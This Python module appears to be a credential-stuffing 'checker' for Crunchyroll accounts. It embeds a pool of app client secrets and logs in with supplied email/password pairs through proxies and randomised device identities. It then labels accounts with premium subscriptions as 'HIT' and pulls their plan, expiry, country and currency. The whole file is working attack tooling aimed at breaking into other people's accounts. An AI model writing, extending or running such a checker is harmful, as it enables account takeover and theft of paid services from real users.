# checkers/crunchyroll.py
import asyncio
import random
import time
import uuid
import json
import re
import ssl
from datetime import datetime
import aiohttp

# ========================== MULTI-CREDENTIAL POOL ==========================
_CR_CREDENTIALS = [
    ("y2arvjb0h0rgvtizlovy", "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
     "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0", "Android TV", "SamsungTV"),
    ("noaihdeqjmnisdnindsi", "kQXYyIGCOssBpGXIGmIKGTKK",
     "Crunchyroll/3.46.2 Android/14 okhttp/4.12.0", "Android", "Android Phone"),
    ("c4zhso4hzgpiyxzj17vm", "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
     "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0", "Fire TV", "Amazon Fire TV"),
]

_CR_TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
_CR_ME_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
_CR_PRODUCTS_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/products"
_CR_SUB_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}"
_CR_BENEFITS_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"
_CR_SUBS_V4_URL = "https://beta-api.crunchyroll.com/subs/v4/accounts/{}/subscriptions"

STREAM_TIER = {
    "streams.1": "FAN MEMBER",
    "streams.4": "MEGA FAN MEMBER",
    "streams.6": "ULTIMATE FAN MEMBER",
}

_T = aiohttp.ClientTimeout(total=25, connect=8)

def _is_zero_date(d) -> bool:
    if not d:
        return True
    s = str(d)
    return s.startswith("0001") or s in ("null", "N/A", "")

def translate_country(code: str) -> str:
    country_map = {
        "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "CA": "Canada 🇨🇦",
        "AU": "Australia 🇦🇺", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷",
        "IT": "Italy 🇮🇹", "ES": "Spain 🇪🇸", "BR": "Brazil 🇧🇷",
        "MX": "Mexico 🇲🇽", "AR": "Argentina 🇦🇷", "CL": "Chile 🇨🇱",
        "CO": "Colombia 🇨🇴", "PE": "Peru 🇵🇪", "JP": "Japan 🇯🇵",
        "KR": "South Korea 🇰🇷", "IN": "India 🇮🇳", "RU": "Russia 🇷🇺",
        "ZA": "South Africa 🇿🇦", "EG": "Egypt 🇪🇬", "SA": "Saudi Arabia 🇸🇦",
        "AE": "United Arab Emirates 🇦🇪", "TR": "Turkey 🇹🇷", "PL": "Poland 🇵🇱",
        "SE": "Sweden 🇸🇪", "NO": "Norway 🇳🇴", "DK": "Denmark 🇩🇰",
        "FI": "Finland 🇫🇮", "NL": "Netherlands 🇳🇱", "BE": "Belgium 🇧🇪",
        "CH": "Switzerland 🇨🇭", "AT": "Austria 🇦🇹", "GR": "Greece 🇬🇷",
        "PT": "Portugal 🇵🇹", "IE": "Ireland 🇮🇪", "NZ": "New Zealand 🇳🇿",
        "SG": "Singapore 🇸🇬", "MY": "Malaysia 🇲🇾", "ID": "Indonesia 🇮🇩",
        "TH": "Thailand 🇹🇭", "VN": "Vietnam 🇻🇳", "PH": "Philippines 🇵🇭"
    }
    return country_map.get(code, code)

class CrunchyrollChecker:
    @staticmethod
    def make_ssl_ctx():
        ctx = ssl.create_default_context()
        ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        return ctx

    @staticmethod
    async def _cr_login(email: str, password: str, session: aiohttp.ClientSession, proxy: Optional[str], cred_idx: int) -> dict:
        client_id, client_secret, ua, device_type, device_name = _CR_CREDENTIALS[cred_idx % len(_CR_CREDENTIALS)]
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "host": "beta-api.crunchyroll.com",
            "x-datadog-sampling-priority": "0",
            "Accept-Encoding": "gzip",
            "user-agent": ua,
        }
        payload = (
            f"grant_type=password&username={email}&password={password}"
            f"&scope=offline_access&client_id={client_id}&client_secret={client_secret}"
            f"&device_type={device_name}&device_id={str(uuid.uuid4())}&device_name=Goku"
        )
        async with session.post(_CR_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=_T) as r:
            txt = await r.text()
            if r.status == 200 and '"access_token"' in txt:
                data = json.loads(txt)
                return {
                    "status": "ok",
                    "access_token": data.get("access_token", ""),
                    "profile_id": data.get("profile_id", ""),
                    "account_id": data.get("account_id", "")
                }
            if any(x in txt for x in ["invalid_grant", "invalid_credentials", "force_password_reset", "missing_required_field"]):
                return {"status": "invalid"}
            if r.status in (400, 401):
                return {"status": "invalid"}
            if r.status == 429 or "too_many_requests" in txt.lower():
                raise ValueError("Too Many Requests")
            if r.status >= 500:
                raise ValueError(f"Server Error {r.status}")
            raise ValueError(f"HTTP_{r.status}")

    @staticmethod
    async def _cr_get_account(token: str, session: aiohttp.ClientSession, proxy: Optional[str]) -> dict:
        hdrs = {
            "authorization": f"Bearer {token}",
            "host": "beta-api.crunchyroll.com",
            "user-agent": _CR_CREDENTIALS[0][2],
            "connection": "Keep-Alive"
        }
        for attempt in range(2):
            try:
                async with session.get(_CR_ME_URL, headers=hdrs, proxy=proxy, timeout=_T) as r:
                    if r.status == 200:
                        return await r.json(content_type=None)
                    if r.status == 429:
                        await asyncio.sleep(0.5 + attempt * 0.5)
            except Exception:
                if attempt == 0:
                    await asyncio.sleep(0.3)
        return {}

    @staticmethod
    async def _cr_fetch_sub(ext_id: str, profile_id: str, token: str, session: aiohttp.ClientSession, proxy: Optional[str]) -> dict:
        hdrs = {
            "authorization": f"Bearer {token}",
            "host": "beta-api.crunchyroll.com",
            "user-agent": _CR_CREDENTIALS[0][2],
            "connection": "Keep-Alive"
        }

        async def _get(url):
            if not url:
                return None
            try:
                async with session.get(url, headers=hdrs, proxy=proxy, timeout=_T) as r:
                    return await r.json(content_type=None) if r.status == 200 else None
            except Exception:
                return None

        async def _gettext(url):
            if not url:
                return ""
            try:
                async with session.get(url, headers=hdrs, proxy=proxy, timeout=_T) as r:
                    return await r.text() if r.status == 200 else ""
            except Exception:
                return ""

        # All 4 sub-requests fire in PARALLEL
        results = await asyncio.gather(
            _get(_CR_PRODUCTS_URL.format(ext_id)),
            _gettext(_CR_BENEFITS_URL.format(ext_id)),
            _get(_CR_SUB_URL.format(ext_id)),
            _gettext(_CR_SUBS_V4_URL.format(profile_id) if profile_id else None),
            return_exceptions=True,
        )
        prod_d = results[0] if not isinstance(results[0], BaseException) else None
        ben_txt = results[1] if not isinstance(results[1], BaseException) else ""
        sub_d = results[2] if not isinstance(results[2], BaseException) else None
        v4_txt = results[3] if not isinstance(results[3], BaseException) else ""

        plan = "Free"
        currency = "N/A"
        subscribable = False
        free_trial = False
        product_expiry = ""
        if isinstance(prod_d, dict):
            items = prod_d.get("items", [])
            if items:
                item = items[0]
                product = item.get("product", {})
                plan = product.get("sku") or product.get("name") or "Gift Access"
                currency = item.get("currency_code", "N/A")
                subscribable = product.get("is_subscribable", False) or item.get("is_active", False)
                free_trial = item.get("active_free_trial", False)
                for k in ["active_until", "end_date", "expiration_date", "next_billing_date"]:
                    v = item.get(k)
                    if v and not _is_zero_date(v):
                        product_expiry = str(v).split("T")[0]
                        break

        plan_tier = ""
        benefit_country = ""
        benefits_premium = False
        if isinstance(ben_txt, str) and ben_txt:
            try:
                if "subscription.not_found" not in ben_txt:
                    ben_d = json.loads(ben_txt)
                    if ben_d.get("total", 0) > 0:
                        benefits_premium = True
                        m = re.search(r'"subscription_country":"([^"]+)"', ben_txt)
                        if m:
                            benefit_country = m.group(1)
                        m = re.search(r'"benefit":"concurrent_(streams\.\d+)"', ben_txt)
                        if m:
                            plan_tier = STREAM_TIER.get(m.group(1), "")
            except Exception:
                pass

        expiry = "N/A"
        plan_duration = "N/A"
        is_active = False
        country_code = benefit_country or "US"
        is_cancelled = False
        if isinstance(sub_d, dict):
            for k in ["next_renewal_date", "end_date", "expiration_date", "billing_date"]:
                v = sub_d.get(k)
                if v and not _is_zero_date(v):
                    expiry = str(v).split("T")[0]
                    break
            if expiry == "N/A" and product_expiry:
                expiry = product_expiry
            plan_duration = sub_d.get("cycle_duration", "N/A")
            is_active = sub_d.get("is_active", False)
            country_code = sub_d.get("country_code") or benefit_country or "US"
            is_cancelled = sub_d.get("is_cancelled", False)

        remaining_days = -1
        if isinstance(v4_txt, str) and v4_txt:
            m = re.search(r'"nextRenewalDate":"([^"T]+)', v4_txt)
            if m and not _is_zero_date(m.group(1)):
                v4_date = m.group(1).split("T")[0]
                if expiry == "N/A":
                    expiry = v4_date
                try:
                    remaining_days = (datetime.strptime(v4_date, "%Y-%m-%d") - datetime.now()).days
                except Exception:
                    pass

        if remaining_days == -1 and expiry != "N/A":
            try:
                remaining_days = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
            except Exception:
                pass

        is_premium = (benefits_premium or is_active or (remaining_days > 0) or (subscribable and not is_cancelled))
        is_custom = (not is_premium) and is_cancelled and plan != "Free"

        return {
            "plan": plan,
            "plan_tier": plan_tier,
            "currency": currency,
            "subscribable": subscribable,
            "free_trial": free_trial,
            "expiry": expiry,
            "remaining_days": remaining_days,
            "plan_duration": plan_duration,
            "is_active": is_active,
            "country": country_code,
            "is_premium": is_premium,
            "is_custom": is_custom,
            "is_cancelled": is_cancelled,
        }

    @staticmethod
    async def check(email: str, password: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Crunchyroll"""
        try:
            ssl_ctx = CrunchyrollChecker.make_ssl_ctx()
            connector = aiohttp.TCPConnector(
                limit=0,
                ttl_dns_cache=300,
                enable_cleanup_closed=True,
                force_close=False,
                ssl=ssl_ctx,
            )

            proxy_url = None
            if proxy:
                if "://" not in proxy:
                    proxy_url = f"http://{proxy}"
                else:
                    proxy_url = proxy

            async with aiohttp.ClientSession(connector=connector) as session:
                cred_idx = random.randint(0, len(_CR_CREDENTIALS) - 1)

                # === LOGIN ===
                try:
                    result = await CrunchyrollChecker._cr_login(email, password, session, proxy_url, cred_idx)
                except ValueError as e:
                    err_msg = str(e)
                    if "INVALID" in err_msg.upper() or "401" in err_msg:
                        return {'status': 'INVALID', 'email': email, 'password': password}
                    elif "Too Many Requests" in err_msg:
                        return {'status': 'ERROR', 'email': email, 'password': password, 'error': 'Rate limit'}
                    else:
                        return {'status': 'ERROR', 'email': email, 'password': password, 'error': err_msg}
                except Exception as e:
                    return {'status': 'ERROR', 'email': email, 'password': password, 'error': str(e)}

                if result.get("status") == "invalid":
                    return {'status': 'INVALID', 'email': email, 'password': password}

                token = result.get("access_token", "")
                profile_id = result.get("profile_id", "")

                plan = "Free"
                plan_tier = ""
                expiry = "N/A"
                country = "US"
                currency = "N/A"
                remaining_days = -1
                free_trial = False
                is_premium = False
                is_custom = False
                email_verified = False
                created = ""

                if token:
                    try:
                        acct = await CrunchyrollChecker._cr_get_account(token, session, proxy_url)
                        email_verified = acct.get("email_verified", False)
                        created = (acct.get("created") or "").split("T")[0]
                        ext_id = acct.get("external_id", "")

                        if ext_id:
                            sub = await CrunchyrollChecker._cr_fetch_sub(ext_id, profile_id, token, session, proxy_url)
                            plan = sub["plan"]
                            plan_tier = sub["plan_tier"]
                            expiry = sub["expiry"]
                            country = sub["country"]
                            currency = sub["currency"]
                            remaining_days = sub["remaining_days"]
                            free_trial = sub["free_trial"]
                            is_premium = sub["is_premium"]
                            is_custom = sub["is_custom"]
                    except Exception:
                        is_premium = True
                        plan = "Unknown (fetch error)"

                if is_premium:
                    return {
                        'status': 'HIT',
                        'email': email,
                        'password': password,
                        'plan': plan,
                        'plan_tier': plan_tier,
                        'expiry': expiry,
                        'remaining_days': remaining_days,
                        'country': translate_country(country),
                        'currency': currency,
                        'free_trial': free_trial,
                        'email_verified': email_verified,
                        'created_date': created,
                        'is_premium': True
                    }
                elif is_custom:
                    return {
                        'status': 'CUSTOM',
                        'email': email,
                        'password': password,
                        'plan': plan,
                        'expiry': expiry,
                        'is_premium': False
                    }
                else:
                    return {
                        'status': 'FREE',
                        'email': email,
                        'password': password,
                        'is_premium': False
                    }

        except Exception as e:
            return {'status': 'ERROR', 'email': email, 'password': password, 'error': str(e)}